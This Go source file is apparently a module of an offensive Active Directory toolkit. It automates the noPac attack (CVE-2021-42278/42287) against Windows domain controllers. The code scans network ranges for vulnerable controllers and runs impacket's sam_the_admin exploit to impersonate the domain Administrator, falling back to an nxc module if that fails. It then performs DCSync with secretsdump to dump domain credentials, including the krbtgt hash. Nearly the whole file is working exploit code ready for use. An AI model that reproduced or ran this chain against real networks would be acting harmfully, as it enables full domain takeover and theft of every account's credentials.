package modules

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	"adpack/utils"
)

type NoPacManager struct{}

// Check tests whether a DC is vulnerable to noPac (CVE-2021-42278 + CVE-2021-42287).
func (n *NoPacManager) Check(dcIP, domain, user, pass string) error {
	if dcIP == "" {
		return fmt.Errorf("dc-ip is required")
	}
	fmt.Printf("[*] Checking %s for noPac (CVE-2021-42278/42287)...\n", dcIP)
	cmd := exec.Command("nxc", "smb", dcIP, "-M", "nopac")
	if domain != "" && user != "" && pass != "" {
		cmd.Args = append(cmd.Args, "-d", domain, "-u", user, "-p", pass)
	}
	out, err := cmd.CombinedOutput()
	output := string(out)
	fmt.Println(output)
	if err != nil {
		return fmt.Errorf("nopac check failed: %w", err)
	}
	if strings.Contains(output, "VULNERABLE") {
		fmt.Println("[+] Target is VULNERABLE to noPac!")
	} else {
		fmt.Println("[-] Target does not appear vulnerable to noPac")
	}
	return nil
}

// Exploit performs the full noPac attack chain:
// 1. Request TGT for a computer account without a PAC
// 2. Request service ticket impersonating DA using the PAC-less TGT
func (n *NoPacManager) Exploit(dcIP, domain, user, pass, hash, targetUser string) error {
	if dcIP == "" || domain == "" || user == "" || pass == "" {
		return fmt.Errorf("dc-ip, domain, user, and password are required")
	}
	if targetUser == "" {
		targetUser = "Administrator"
	}

	fmt.Printf("[*] Exploiting noPac on %s (target: %s)...\n", dcIP, targetUser)

	script := `import sys, os, subprocess

# Auto-detect impacket examples path
paths = [
    '/usr/share/doc/python3-impacket/examples',
    '/usr/share/doc/impacket/examples',
    '/opt/impacket/examples',
    '/usr/local/lib/python3/dist-packages/impacket/examples',
]
for p in paths:
    if os.path.isdir(p):
        sys.path.insert(0, p)
        break

from impacket.examples.sam_the_admin import SamTheAdmin

exploit = SamTheAdmin(
    username=os.environ['ADPACK_USER'],
    password=os.environ['ADPACK_PASS'],
    domain=os.environ['ADPACK_DOMAIN'],
    dc_ip=os.environ['ADPACK_DCIP'],
    target_user=os.environ.get('ADPACK_TARGET', 'Administrator'),
    hashes=os.environ.get('ADPACK_HASHES', ''),
    dump=True,
)
exploit.run()
`
	cmd := exec.Command("python3", "-c", script)
	cmd.Env = append(os.Environ(),
		"ADPACK_USER="+user,
		"ADPACK_PASS="+pass,
		"ADPACK_DOMAIN="+domain,
		"ADPACK_DCIP="+dcIP,
		"ADPACK_TARGET="+targetUser,
		"ADPACK_HASHES="+hash,
	)
	out, err := cmd.CombinedOutput()
	output := string(out)
	fmt.Println(output)
	if err != nil {
		// Fallback: try nxc nopac module
		fmt.Println("[*] sam_the_admin failed, trying nxc nopac module...")
		cmd2 := exec.Command("nxc", "smb", dcIP, "-M", "nopac", "-d", domain, "-u", user, "-p", pass)
		if targetUser != "" {
			cmd2.Args = append(cmd2.Args, "-o", "COMMAND=whoami", "TARGETUSER="+targetUser)
		}
		out2, err2 := cmd2.CombinedOutput()
		output = string(out2)
		fmt.Println(output)
		if err2 != nil {
			return fmt.Errorf("nopac exploit failed: %w", err2)
		}
	}

	if strings.Contains(output, "Saved TGT") || strings.Contains(output, "Administrator") {
		utils.StepOk("noPac exploit successful")
	}
	return nil
}

// DCSyncAfterNoPac performs DCSync using a ticket obtained via noPac.
func (n *NoPacManager) DCSyncAfterNoPac(dcIP, domain, dcHostname string) error {
	if dcIP == "" || domain == "" {
		return fmt.Errorf("dc-ip and domain are required")
	}
	if dcHostname == "" {
		dcHostname = dcIP
	}
	fmt.Printf("[*] DCSyncing %s after noPac...\n", dcHostname)

	ticketPath := fmt.Sprintf("/tmp/%s_Administrator.ccache", domain)
	cmd := exec.Command("impacket-secretsdump", "-k", "-no-pass", "-just-dc", dcHostname+"."+domain)
	cmd.Env = append(os.Environ(), "KRB5CCNAME="+ticketPath)
	out, err := cmd.CombinedOutput()
	output := string(out)
	fmt.Println(output)
	if err != nil {
		return fmt.Errorf("dcsync after nopac failed: %w", err)
	}
	if strings.Contains(output, "krbtgt") {
		utils.StepOk("noPac DCSync complete — krbtgt hash captured")
	}
	return nil
}

// Scan scans a range for noPac-vulnerable DCs.
func (n *NoPacManager) Scan(target string) error {
	if target == "" {
		return fmt.Errorf("target is required")
	}
	fmt.Printf("[*] Scanning %s for noPac-vulnerable DCs...\n", target)
	cmd := exec.Command("nxc", "smb", target, "-M", "nopac")
	out, err := cmd.CombinedOutput()
	output := string(out)
	fmt.Println(output)
	if err != nil {
		return fmt.Errorf("nopac scan failed: %w", err)
	}
	vulnCount := strings.Count(output, "VULNERABLE")
	fmt.Printf("[*] Found %d potentially vulnerable DCs\n", vulnCount)
	return nil
}
